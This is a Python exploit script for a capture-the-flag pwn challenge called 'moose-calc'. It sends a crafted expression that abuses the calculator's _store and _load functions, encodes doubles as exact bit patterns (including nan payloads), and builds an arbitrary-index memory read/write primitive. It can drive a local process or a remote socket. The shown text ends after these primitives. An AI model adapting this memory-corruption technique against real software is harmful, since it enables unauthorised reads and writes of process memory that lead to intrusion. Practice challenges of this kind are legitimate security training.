import subprocess, struct, socket, sys, os
CWD="/home/null/Desktop/vuwCTF-2026/pwn/moose-calc"

EXPR='((_store(g, (a + (h * (e * _store(c, g)))))) * 0) + _load(c) + (_store(c, d) * 0)'
VARLINE="a c d e g h"   # a=index, d=value-to-write, rest must stay 0

def d2b(x): return struct.unpack('<Q', struct.pack('<d', x))[0]
def b2d(u): return struct.unpack('<d', struct.pack('<Q', u))[0]

def fmt(u):
    """decimal/hex string that strtod turns into exactly bit pattern u"""
    e = (u >> 52) & 0x7ff
    if e == 0x7ff:
        m = u & ((1 << 52) - 1)
        s = "-" if u >> 63 else ""
        if m == 0: return s + "inf"
        return s + "nan(0x%x)" % m
    return float.hex(b2d(u))

class Tube:
    def __init__(self, target=None):
        if target:
            host, port = target
            self.s = socket.create_connection((host, port), timeout=10)
            self.f = self.s.makefile('rwb', buffering=0)
            self.p = None
        else:
            self.p = subprocess.Popen(["./moosecalc"], cwd=CWD, stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            self.f = None
    def send(self, data):
        if isinstance(data, str): data = data.encode()
        w = self.f if self.f else self.p.stdin
        w.write(data)
        if self.p: w.flush()
    def readline(self):
        r = self.f if self.f else self.p.stdout
        return r.readline()
    def readuntil(self, delim):
        buf = b""
        while delim not in buf:
            c = (self.f if self.f else self.p.stdout).read(1)
            if not c: break
            buf += c
        return buf
    def close(self):
        try:
            if self.p: self.p.kill()
            else: self.s.close()
        except Exception: pass

def start(target=None):
    t = Tube(target)
    t.readuntil(b"Enter expression:\n")
    t.send(EXPR + "\n")
    t.readuntil(b"Enter list of input variables:\n")
    t.send(VARLINE + "\n")
    t.readuntil(b"one set per line\n\n")
    return t

def query(t, idx, val_bits=0):
    """returns the 64-bit content of mem[idx] (as it was), and writes val_bits there"""
    line = "%d 0 %s 0 0 0\n" % (idx, fmt(val_bits))
    t.send(line)
    r = t.readline().strip()
    if not r: raise EOFError("no reply (idx=%d)" % idx)
    return d2b(float(r))

def read(t, idx):
    """non-destructive read: read (zeroing), then write the value back"""
    v = query(t, idx, 0)
    query(t, idx, v)
    return v

def write(t, idx, val):
    query(t, idx, val)
